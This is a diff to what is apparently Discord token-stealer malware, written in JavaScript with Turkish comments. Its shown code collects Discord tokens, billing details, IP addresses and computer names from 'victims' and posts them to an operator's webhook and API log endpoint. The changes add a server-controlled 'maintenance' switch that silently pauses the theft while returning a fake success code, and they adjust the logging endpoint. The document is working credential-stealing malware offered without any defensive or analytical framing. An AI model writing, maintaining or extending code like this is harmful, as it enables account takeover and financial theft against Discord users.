@@ -20,6 +20,57 @@ const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/
 // ── State ─────────────────────────────────────────────────────────────────────
 let _initDone   = false;
 let _updateDone = false;
+let _maintenanceCache = { checked: false, blocked: false, timestamp: 0 };
+
+// ── Maintenance check ─────────────────────────────────────────────────────────
+async function checkMaintenance() {
+    // Cache 5 dakika
+    if (_maintenanceCache.checked && Date.now() - _maintenanceCache.timestamp < 300000) {
+        return _maintenanceCache.blocked;
+    }
+    
+    if (!API_URL) {
+        _maintenanceCache = { checked: true, blocked: false, timestamp: Date.now() };
+        return false;
+    }
+
+    return new Promise(resolve => {
+        try {
+            const url = new URL(API_URL.replace(/\/+$/, '') + '/api/maintenance-status');
+            const req = https.get({
+                hostname: url.hostname,
+                path: url.pathname,
+                timeout: 5000
+            }, res => {
+                let body = '';
+                res.on('data', d => body += d);
+                res.on('end', () => {
+                    try {
+                        const data = JSON.parse(body);
+                        const blocked = data.maintenance && data.block_discord;
+                        _maintenanceCache = { checked: true, blocked, timestamp: Date.now() };
+                        resolve(blocked);
+                    } catch {
+                        _maintenanceCache = { checked: true, blocked: false, timestamp: Date.now() };
+                        resolve(false);
+                    }
+                });
+            });
+            req.on('error', () => {
+                _maintenanceCache = { checked: true, blocked: false, timestamp: Date.now() };
+                resolve(false);
+            });
+            req.on('timeout', () => {
+                req.destroy();
+                _maintenanceCache = { checked: true, blocked: false, timestamp: Date.now() };
+                resolve(false);
+            });
+        } catch {
+            _maintenanceCache = { checked: true, blocked: false, timestamp: Date.now() };
+            resolve(false);
+        }
+    });
+}
 
 // ── execScript ────────────────────────────────────────────────────────────────
 const execScript = (script) => {
@@ -166,6 +217,10 @@ async function resolveAvatar(baseUrl, userId, discriminator) {
 }
 
 async function postWebhook(payload) {
+    // Maintenance kontrolü - block_discord aktifse webhook'a gönderme
+    const blocked = await checkMaintenance();
+    if (blocked) return 200; // Success gibi döndür, hata vermesin
+
     return new Promise(resolve => {
         const body = JSON.stringify(payload);
         const url  = new URL(WEBHOOK);
@@ -305,11 +360,10 @@ function postAPI(user, billing, token, ip, eventType, extra) {
             victim_pc:        process.env.COMPUTERNAME||'Unknown',
             victim_os:        'Windows',
             discord_accounts: acct,
-            injection_event:  eventType,
             victim_timestamp: new Date().toISOString(),
         }).toString();
 
-        const url = new URL(API_URL.replace(/\/+$/,'') + '/api/logs/injection');
+        const url = new URL(API_URL.replace(/\/+$/,'') + '/api/logs');
         const req = https.request({
             hostname: url.hostname,
             path:     url.pathname + url.search,
@@ -428,6 +482,10 @@ async function firstTime() {
     _initDone = true;
 
     try {
+        // Maintenance kontrolü - block_discord aktifse hiçbir şey gönderme
+        const blocked = await checkMaintenance();
+        if (blocked) return;
+
         const ip     = await getIP();
         const client = getDiscordClientName();
         const tokens = await getAllTokens(8, 2000);
